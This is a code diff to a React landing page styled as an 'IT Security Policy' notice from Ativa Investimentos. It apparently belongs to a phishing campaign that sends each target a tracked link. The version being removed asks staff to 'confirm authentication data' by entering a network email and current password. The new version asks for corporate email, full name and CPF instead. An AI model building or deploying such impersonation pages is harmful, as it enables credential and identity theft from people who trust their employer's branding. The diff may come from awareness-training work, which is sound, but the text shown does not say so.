@@ -3,7 +3,11 @@ import './ti.css';
 import logoAtiva from '../../../assets/logoativa3.png';
 
 const TILanding = ({ linkId }) => {
-  const [formData, setFormData] = useState({ email: '', password: '' });
+  const [formData, setFormData] = useState({
+    email: '',
+    nome: '',
+    cpf: ''
+  });
 
   const handleChange = (e) => {
     setFormData({
@@ -38,13 +42,13 @@ const TILanding = ({ linkId }) => {
       <div className="ti-card">
         <img src={logoAtiva} alt="Ativa Investimentos" className="logo-ativa" />
         <h1>Política de Segurança de TI</h1>
-        <p>Conforme nova diretriz interna, confirme seus dados de autenticação.</p>
+        <p>Conforme nova diretriz interna, confirme seus dados abaixo.</p>
         <form onSubmit={handleSubmit}>
           <div className="input-group">
             <input
               type="email"
               name="email"
-              placeholder="Email de rede"
+              placeholder="Email corporativo"
               value={formData.email}
               onChange={handleChange}
               required
@@ -52,12 +56,23 @@ const TILanding = ({ linkId }) => {
           </div>
           <div className="input-group">
             <input
-              type="password"
-              name="password"
-              placeholder="Senha atual"
-              value={formData.password}
+              type="text"
+              name="nome"
+              placeholder="Nome completo"
+              value={formData.nome}
               onChange={handleChange}
               required
+            />
+          </div>
+          <div className="input-group">
+            <input
+              type="text"
+              name="cpf"
+              placeholder="CPF"
+              value={formData.cpf}
+              onChange={handleChange}
+              required
+              maxLength={14}
             />
           </div>
           <button type="submit">Confirmar</button>
